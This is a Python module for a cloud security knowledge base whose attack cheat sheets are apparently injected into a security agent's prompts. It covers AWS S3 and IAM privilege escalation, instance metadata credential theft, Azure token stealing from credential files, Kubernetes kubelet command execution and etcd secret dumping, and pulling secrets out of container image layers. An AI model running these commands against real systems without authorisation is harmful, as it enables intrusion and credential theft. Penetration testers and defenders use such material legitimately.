"""Cloud security knowledge base.

Deep knowledge about cloud vulnerabilities:
1. AWS security misconfigurations
2. Azure/Entra ID exploitation
3. GCP security issues
4. Kubernetes cluster attacks
5. Serverless security
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class CloudPattern:
    """A cloud security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    provider: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "provider": self.provider[:8],
        }


CLOUD_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "cloud-001", "name": "AWS S3 and IAM Misconfiguration",
        "category": "storage_iam", "provider": "aws", "severity": "critical",
        "desc": "Exploiting AWS S3 bucket and IAM misconfigurations.",
        "detection": (
            "AWS S3 AND IAM:\n"
            "S3 BUCKET ENUMERATION:\n"
            "  # Discover buckets\n"
            "  aws s3 ls  # List own buckets\n"
            "  # Brute force bucket names\n"
            "  s3scanner scan --bucket-file names.txt\n"
            "  # Check permissions\n"
            "  aws s3 ls s3://<bucket> --no-sign-request  # Unauthenticated\n"
            "  aws s3 cp s3://<bucket>/file .  # Read test\n"
            "  aws s3 cp test.txt s3://<bucket>/  # Write test\n"
            "COMMON MISCONFIGS:\n"
            "  - Public read: Anyone can list/download objects\n"
            "  - Public write: Anyone can upload/overwrite\n"
            "  - ACL: authenticated-users grants to ALL AWS accounts\n"
            "  - Bucket policy allows s3:* to *\n"
            "IAM PRIVILEGE ESCALATION:\n"
            "  # Enumerate permissions\n"
            "  enumerate-iam --access-key <key> --secret-key <secret>\n"
            "  # Pacu (AWS exploitation framework)\n"
            "  pacu > run iam__enum_permissions\n"
            "  pacu > run iam__privesc_scan\n"
            "  # Common escalation paths:\n"
            "  - iam:CreatePolicyVersion → create admin policy\n"
            "  - iam:AttachUserPolicy → attach admin to self\n"
            "  - iam:PutUserPolicy → inline admin policy\n"
            "  - iam:PassRole + lambda:CreateFunction → execute as role\n"
            "  - iam:PassRole + ec2:RunInstances → launch with role\n"
            "METADATA SERVICE:\n"
            "  # IMDSv1 (SSRF target)\n"
            "  curl http://169.254.169.254/latest/meta-data/\n"
            "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n"
            "  # Returns temporary credentials → full role access"
        ),
        "tools": ["pacu", "s3scanner", "enumerate-iam"],
    },
    {
        "id": "cloud-002", "name": "Azure/Entra ID Exploitation",
        "category": "identity", "provider": "azure", "severity": "critical",
        "desc": "Exploiting Azure and Entra ID (formerly Azure AD).",
        "detection": (
            "AZURE/ENTRA ID:\n"
            "ENUMERATION:\n"
            "  # Azure AD user enumeration\n"
            "  # Check if email exists (no auth needed)\n"
            "  curl 'https://login.microsoftonline.com/<tenant>/v2.0/.well-known/openid-configuration'\n"
            "  # Tools\n"
            "  roadtx auth -u user@domain.com  # ROADtools\n"
            "  azurehound -u user -p pass  # BloodHound for Azure\n"
            "TOKEN ABUSE:\n"
            "  # Steal tokens from:\n"
            "  - Azure CLI: ~/.azure/accessTokens.json\n"
            "  - PowerShell: Get-AzAccessToken\n"
            "  - Environment: AZURE_CLIENT_SECRET\n"
            "  - Managed Identity: http://169.254.169.254/metadata/identity/oauth2/token\n"
            "  # Use stolen token\n"
            "  az account get-access-token\n"
            "  # Access resources with token\n"
            "PRIVILEGE ESCALATION:\n"
            "  - Application with AppRoleAssignment.ReadWrite.All\n"
            "  - User with Privileged Role Administrator\n"
            "  - Consent grant attacks (illicit consent)\n"
            "  - Managed Identity on compromised VM\n"
            "  - Key Vault access from compromised app\n"
            "AZURE STORAGE:\n"
            "  - Blob containers with public access\n"
            "  - Shared Access Signatures (SAS) misconfiguration\n"
            "  - Over-permissive SAS tokens"
        ),
        "tools": ["roadtools", "azurehound", "az-cli"],
    },
    {
        "id": "cloud-003", "name": "Kubernetes Cluster Attacks",
        "category": "k8s", "provider": "multi", "severity": "critical",
        "desc": "Attacking Kubernetes clusters and workloads.",
        "detection": (
            "KUBERNETES ATTACKS:\n"
            "ENUMERATION:\n"
            "  # Unauthenticated API access\n"
            "  curl -k https://<api-server>:6443/api/v1/pods\n"
            "  curl -k https://<api-server>:6443/api/v1/secrets\n"
            "  # With service account token\n"
            "  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
            "  curl -k -H \"Authorization: Bearer $TOKEN\" https://<api>:6443/api/v1/namespaces\n"
            "  # kubectl (if available)\n"
            "  kubectl auth can-i --list  # Check permissions\n"
            "  kubectl get secrets -A  # All secrets\n"
            "COMMON ATTACKS:\n"
            "  - Exposed Dashboard (no auth)\n"
            "  - etcd exposed (port 2379) → all cluster secrets\n"
            "    etcdctl get / --prefix --keys-only\n"
            "  - Kubelet API (port 10250)\n"
            "    curl -k https://<node>:10250/pods\n"
            "    curl -k https://<node>:10250/run/<ns>/<pod>/<container> -d 'cmd=id'\n"
            "  - Tiller (Helm v2) → cluster-admin\n"
            "CONTAINER ESCAPE:\n"
            "  - Privileged containers → host access\n"
            "  - hostPID/hostNetwork → see host processes/network\n"
            "  - Mounted host paths\n"
            "  - CAP_SYS_ADMIN → cgroup escape\n"
            "LATERAL MOVEMENT:\n"
            "  - Service account token theft\n"
            "  - Secret enumeration\n"
            "  - Pod-to-pod via ClusterIP services"
        ),
        "tools": ["kubectl", "kubeaudit", "kube-hunter"],
    },
    {
        "id": "cloud-004", "name": "Serverless Security",
        "category": "serverless", "provider": "multi", "severity": "high",
        "desc": "Attacking serverless functions and event-driven architectures.",
        "detection": (
            "SERVERLESS SECURITY:\n"
            "AWS LAMBDA:\n"
            "  - Over-permissive execution role\n"
            "  - Environment variables with secrets\n"
            "  - Event injection (API Gateway, S3, SNS)\n"
            "  - Dependency confusion in layers\n"
            "  - Cold start timing attacks\n"
            "  # Check function config\n"
            "  aws lambda get-function --function-name <name>\n"
            "  aws lambda get-policy --function-name <name>\n"
            "  aws lambda list-event-source-mappings\n"
            "EVENT INJECTION:\n"
            "  - API Gateway: HTTP parameter injection\n"
            "  - S3 trigger: Upload malicious file with crafted name\n"
            "  - SNS/SQS: Message injection\n"
            "  - DynamoDB Streams: Record manipulation\n"
            "  # The event JSON is the attack surface\n"
            "  # Inject into: body, headers, queryStringParameters, pathParameters\n"
            "AZURE FUNCTIONS:\n"
            "  - Function keys in URL (if leaked)\n"
            "  - Managed Identity escalation\n"
            "  - Shared file system between functions\n"
            "GCP CLOUD FUNCTIONS:\n"
            "  - IAM misconfiguration\n"
            "  - Service account key exposure\n"
            "  - Pub/Sub message injection\n"
            "COMMON ISSUES:\n"
            "  - Secrets in environment variables (not vault)\n"
            "  - Over-permissive IAM roles\n"
            "  - No input validation on event data\n"
            "  - Logging sensitive data"
        ),
        "tools": ["pacu", "serverless-goat"],
    },
    {
        "id": "cloud-005", "name": "Container Registry and Image Attacks",
        "category": "container_registry", "provider": "multi", "severity": "high",
        "desc": "Attacking container registries and images.",
        "detection": (
            "CONTAINER REGISTRY ATTACKS:\n"
            "REGISTRY ENUMERATION:\n"
            "  # Docker Hub\n"
            "  curl https://hub.docker.com/v2/repositories/<org>/?page_size=100\n"
            "  # Private registries\n"
            "  curl https://<registry>/v2/_catalog\n"
            "  curl https://<registry>/v2/<repo>/tags/list\n"
            "  # Pull and inspect\n"
            "  docker pull <registry>/<image>:<tag>\n"
            "  docker history <image>  # See layers\n"
            "  dive <image>  # Interactive layer explorer\n"
            "SECRET EXTRACTION:\n"
            "  # Secrets baked into image layers\n"
            "  docker save <image> -o image.tar\n"
            "  tar xf image.tar\n"
            "  # Search each layer for secrets\n"
            "  grep -r 'password\\|secret\\|key\\|token' */layer.tar\n"
            "  # Even if deleted in later layer, present in earlier\n"
            "  # Tools: truffleHog, ggshield\n"
            "IMAGE VULNERABILITIES:\n"
            "  trivy image <image>  # Scan for CVEs\n"
            "  grype <image>  # Anchore vulnerability scanner\n"
            "  docker scout cves <image>  # Docker Scout\n"
            "SUPPLY CHAIN:\n"
            "  - Typosquatting on image names\n"
            "  - Base image compromise\n"
            "  - Registry credential theft\n"
            "  - Image signing bypass (cosign/notary)"
        ),
        "tools": ["trivy", "grype", "dive"],
    },
]


class CloudSecurityKB:
    """Cloud security knowledge base.

    Provides cloud vulnerability patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, CloudPattern] = {}
        self._log = logger.bind(component="cloud_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load cloud patterns."""
        for data in CLOUD_PATTERNS:
            pattern = CloudPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                provider=data.get("provider", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_provider(self, provider: str) -> list[CloudPattern]:
        """Get patterns by cloud provider."""
        return [
            p for p in self._patterns.values()
            if p.provider.lower() == provider.lower()
        ]

    def build_cloud_prompt(
        self,
        providers: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build cloud security prompt."""
        lines = ["## Cloud Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if providers and pattern.provider.lower() not in [p.lower() for p in providers]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.provider.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        provider_counts: dict[str, int] = {}
        for p in self._patterns.values():
            provider_counts[p.provider] = provider_counts.get(p.provider, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_provider": provider_counts,
        }
